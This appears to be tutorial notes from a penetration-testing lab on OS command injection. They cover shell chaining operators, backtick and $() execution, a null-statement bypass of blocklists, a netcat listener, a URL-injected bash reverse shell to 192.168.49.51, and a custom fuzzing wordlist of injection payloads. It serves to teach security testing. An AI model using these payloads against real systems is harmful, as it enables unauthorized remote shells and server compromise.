


```shell
http://target:80/python/index.py?ip=127.0.0.1|id
```

Most operating systems allow users to run multiple commands together on one line. In the case of Linux, we can use the semicolon (;), the logical AND (&&), the logical OR (||), and even a single pipe character (|).

```shell
ls -ls
```

As expected, this lists files and directories. As an example of simple command chaining, we will add a semicolon to the end of the command (marking the end of a command in Linux) and follow it with id. This should execute the command sequentially.

```shell
ls -ls ; id
```

We can also use && to chain commands. In this case the second command will only run if the first exits without error:

```shell
whoami && hostname
```

Next, we use && again and note that if the first command fails, the second one won't run.

```shell
foobar && hostname
```

Alternatively, a logical OR (||) will only run the second command if the first fails.

```shell
whoami || id
```

In addition to the semicolon, which allows us to chain multiple commands together in one statement, another unique separator for Linux is the newline (\n), which exists in every HTTP request. Its hexadecimal value is 0x0A.

Finally, let's discuss some Linux-specific inline execution mechanisms. Considers these examples, which use the backtick (`) character and the $() null statement to "wrap" a command ("cmd").

```shell
`cmd`
$(cmd)
```

```shell
echo "This is an `whoami` echo statement"
```

```shell
echo "This is an $(whoami) echo statement"
```

We'll listen (bind) to the 0.0.0.0 interface (-l), request verbose output (-v), print numerical IP addresses and ports in all output (-n), and bind to port 9090 (-p 9090). Let's combine these arguments and run our listener.

```shell
nc -nlvp 9090
```

Now that we have our Netcat listener established, let's consider a sample payload.

```shell
http://target:80/nodejs/index.js?ip=127.0.0.1|bash -c 'bash -i >& /dev/tcp/192.168.49.51/9090 0>&1'
```

URL-encoded

```shell
curl "http://target/nodejs/index.js?ip=127.0.0.1|bash+-c+'bash+-i+>%26+/dev/tcp/192.168.49.51/9090+0>%261'"
```

A Null Statement Injection Bypass can be inserted between any characters of our choosing.

---
    This technique also works for more complex payloads like "nc -nlvp 9090", which becomes: n$()c -n$()lvp 9090
---

```shell
wh$()oami
```

```shell
http://target:80/php/blocklisted.php?ip=127.0.0.1;wh$()oami
```

We'll create the following wordlist as command_injection_custom.txt and place it in our home directory.

```txt
bogus
;id
|id
`id`
i$()d
;i$()d
|i$()d
FAIL||i$()d
&&id
&id
FAIL_INTENT|id
FAIL_INTENT||id
`sleep 5`
`sleep 10`
`id`
$(sleep 5)
$(sleep 10)
$(id)
;`echo 'aWQK' |base64 -d`
FAIL_INTENT|`echo 'aWQK' |base64 -d`
FAIL_INTENT||`echo 'aWQK' |base64 -d`
```


